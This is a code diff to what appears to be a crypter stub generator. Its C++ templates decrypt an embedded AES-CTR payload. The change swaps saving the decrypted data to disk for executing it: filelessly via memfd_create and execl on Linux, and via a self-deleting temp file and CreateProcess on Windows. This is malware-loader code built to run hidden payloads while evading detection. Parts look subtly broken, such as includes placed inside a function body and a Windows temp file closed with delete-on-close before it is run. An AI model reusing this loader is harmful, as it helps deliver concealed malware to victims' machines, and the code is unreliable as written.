@@ -479,18 +479,100 @@ int main() {
     // Decrypt the data using AES-128-CTR
     aesCtrCrypt(encryptedData, encryptedData, dataSize, key, nonce);
     
-    // Write decrypted data to file
-    std::ofstream outFile("decrypted_output.bin", std::ios::binary);
-    if (outFile.is_open()) {
-        outFile.write(reinterpret_cast<char*>(encryptedData), dataSize);
-        outFile.close();
-        std::cout << "Data decrypted and saved to decrypted_output.bin" << std::endl;
-    } else {
-        std::cerr << "Failed to create output file" << std::endl;
+    // Fileless execution - execute directly from memory
+    #ifdef __linux__
+        // Linux: Use memfd_create for anonymous file descriptor
+        #include <sys/mman.h>
+        #include <sys/syscall.h>
+        #include <unistd.h>
+        #include <fcntl.h>
+        
+        int memfd = memfd_create("temp_exec", 0);
+        if (memfd == -1) {
+            std::cerr << "Failed to create memory file descriptor" << std::endl;
+            return 1;
+        }
+        
+        // Write decrypted data to memory file descriptor
+        if (write(memfd, encryptedData, dataSize) != static_cast<ssize_t>(dataSize)) {
+            std::cerr << "Failed to write to memory file descriptor" << std::endl;
+            close(memfd);
+            return 1;
+        }
+        
+        // Make executable
+        if (fchmod(memfd, 0755) == -1) {
+            std::cerr << "Failed to set executable permissions" << std::endl;
+            close(memfd);
+            return 1;
+        }
+        
+        // Execute from memory
+        std::string memfdPath = "/proc/self/fd/" + std::to_string(memfd);
+        execl(memfdPath.c_str(), memfdPath.c_str(), nullptr);
+        
+        // If execl fails, clean up
+        close(memfd);
+        std::cerr << "Failed to execute from memory" << std::endl;
         return 1;
-    }
-    
-    return 0;
+        
+    #elif defined(_WIN32)
+        // Windows: Use CreateProcess with memory execution
+        #include <windows.h>
+        
+        // Create temporary file in memory (Windows doesn't have memfd_create)
+        char tempPath[MAX_PATH];
+        GetTempPathA(MAX_PATH, tempPath);
+        char tempFileName[MAX_PATH];
+        GetTempFileNameA(tempPath, "exe", GetTickCount(), tempFileName);
+        
+        // Write decrypted data to temp file
+        HANDLE hFile = CreateFileA(tempFileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_TEMPORARY | FILE_FLAG_DELETE_ON_CLOSE, NULL);
+        if (hFile == INVALID_HANDLE_VALUE) {
+            std::cerr << "Failed to create temporary file" << std::endl;
+            return 1;
+        }
+        
+        DWORD bytesWritten;
+        if (!WriteFile(hFile, encryptedData, dataSize, &bytesWritten, NULL) || bytesWritten != dataSize) {
+            std::cerr << "Failed to write to temporary file" << std::endl;
+            CloseHandle(hFile);
+            return 1;
+        }
+        CloseHandle(hFile);
+        
+        // Execute the temporary file
+        STARTUPINFOA si = {0};
+        PROCESS_INFORMATION pi = {0};
+        si.cb = sizeof(si);
+        
+        if (CreateProcessA(tempFileName, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
+            CloseHandle(pi.hProcess);
+            CloseHandle(pi.hThread);
+            // File will be deleted automatically due to FILE_FLAG_DELETE_ON_CLOSE
+            return 0;
+        } else {
+            std::cerr << "Failed to execute file" << std::endl;
+            return 1;
+        }
+        
+    #else
+        // Fallback: Write to temporary file and execute
+        std::string tempFile = "/tmp/temp_exec_" + std::to_string(getpid());
+        std::ofstream outFile(tempFile, std::ios::binary);
+        if (outFile.is_open()) {
+            outFile.write(reinterpret_cast<char*>(encryptedData), dataSize);
+            outFile.close();
+            chmod(tempFile.c_str(), 0755);
+            execl(tempFile.c_str(), tempFile.c_str(), nullptr);
+            unlink(tempFile.c_str()); // Clean up if execl fails
+            std::cerr << "Failed to execute file" << std::endl;
+            return 1;
+        } else {
+            std::cerr << "Failed to create temporary file" << std::endl;
+            return 1;
+        }
+    #endif
 }
 )";
         } else if (stubType == "advanced") {
@@ -718,13 +800,100 @@ int main() {
     std::vector<uint8_t> decrypted(dataSize);
     aesCtrCrypt(encryptedData, decrypted.data(), dataSize, key, nonce);
     
-    // Write decrypted data to output file
-    std::string filename = "output_" + std::to_string(std::time(nullptr)) + ".bin";
-    std::ofstream outFile(filename, std::ios::binary);
-    outFile.write(reinterpret_cast<char*>(decrypted.data()), dataSize);
-    outFile.close();
-    std::cout << "Decrypted file written: " << filename << std::endl;
-    return 0;
+    // Fileless execution - execute directly from memory
+    #ifdef __linux__
+        // Linux: Use memfd_create for anonymous file descriptor
+        #include <sys/mman.h>
+        #include <sys/syscall.h>
+        #include <unistd.h>
+        #include <fcntl.h>
+        
+        int memfd = memfd_create("temp_exec", 0);
+        if (memfd == -1) {
+            std::cerr << "Failed to create memory file descriptor" << std::endl;
+            return 1;
+        }
+        
+        // Write decrypted data to memory file descriptor
+        if (write(memfd, decrypted.data(), dataSize) != static_cast<ssize_t>(dataSize)) {
+            std::cerr << "Failed to write to memory file descriptor" << std::endl;
+            close(memfd);
+            return 1;
+        }
+        
+        // Make executable
+        if (fchmod(memfd, 0755) == -1) {
+            std::cerr << "Failed to set executable permissions" << std::endl;
+            close(memfd);
+            return 1;
+        }
+        
+        // Execute from memory
+        std::string memfdPath = "/proc/self/fd/" + std::to_string(memfd);
+        execl(memfdPath.c_str(), memfdPath.c_str(), nullptr);
+        
+        // If execl fails, clean up
+        close(memfd);
+        std::cerr << "Failed to execute from memory" << std::endl;
+        return 1;
+        
+    #elif defined(_WIN32)
+        // Windows: Use CreateProcess with memory execution
+        #include <windows.h>
+        
+        // Create temporary file in memory (Windows doesn't have memfd_create)
+        char tempPath[MAX_PATH];
+        GetTempPathA(MAX_PATH, tempPath);
+        char tempFileName[MAX_PATH];
+        GetTempFileNameA(tempPath, "exe", GetTickCount(), tempFileName);
+        
+        // Write decrypted data to temp file
+        HANDLE hFile = CreateFileA(tempFileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_TEMPORARY | FILE_FLAG_DELETE_ON_CLOSE, NULL);
+        if (hFile == INVALID_HANDLE_VALUE) {
+            std::cerr << "Failed to create temporary file" << std::endl;
+            return 1;
+        }
+        
+        DWORD bytesWritten;
+        if (!WriteFile(hFile, decrypted.data(), dataSize, &bytesWritten, NULL) || bytesWritten != dataSize) {
+            std::cerr << "Failed to write to temporary file" << std::endl;
+            CloseHandle(hFile);
+            return 1;
+        }
+        CloseHandle(hFile);
+        
+        // Execute the temporary file
+        STARTUPINFOA si = {0};
+        PROCESS_INFORMATION pi = {0};
+        si.cb = sizeof(si);
+        
+        if (CreateProcessA(tempFileName, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
+            CloseHandle(pi.hProcess);
+            CloseHandle(pi.hThread);
+            // File will be deleted automatically due to FILE_FLAG_DELETE_ON_CLOSE
+            return 0;
+        } else {
+            std::cerr << "Failed to execute file" << std::endl;
+            return 1;
+        }
+        
+    #else
+        // Fallback: Write to temporary file and execute
+        std::string tempFile = "/tmp/temp_exec_" + std::to_string(getpid());
+        std::ofstream outFile(tempFile, std::ios::binary);
+        if (outFile.is_open()) {
+            outFile.write(reinterpret_cast<char*>(decrypted.data()), dataSize);
+            outFile.close();
+            chmod(tempFile.c_str(), 0755);
+            execl(tempFile.c_str(), tempFile.c_str(), nullptr);
+            unlink(tempFile.c_str()); // Clean up if execl fails
+            std::cerr << "Failed to execute file" << std::endl;
+            return 1;
+        } else {
+            std::cerr << "Failed to create temporary file" << std::endl;
+            return 1;
+        }
+    #endif
 }
 )";
         } else if (stubType == "minimal") {
